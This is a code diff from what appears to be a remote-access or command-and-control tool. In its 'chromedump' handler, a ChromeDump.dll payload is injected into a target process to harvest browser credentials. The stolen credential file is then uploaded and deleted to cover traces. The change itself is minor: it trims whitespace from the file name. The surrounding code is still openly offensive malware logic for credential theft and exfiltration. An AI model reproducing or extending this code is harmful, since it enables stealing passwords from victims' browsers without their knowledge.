@@ -644,7 +644,7 @@ Open Ports
                 elif(main == "chromedump"):
                     # print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
                     DLLTransfer("payloads/ChromeDump.dll", setting('inject_process')) # Inject ChromeDump.dll
-                    credfile = hostList[location].split("/")[0]
+                    credfile = hostList[location].split("/")[0].strip()
                     self.SendData("fupload:"+credfile)
                     time.sleep(2)
                     self.SendData("delete:"+credfile)
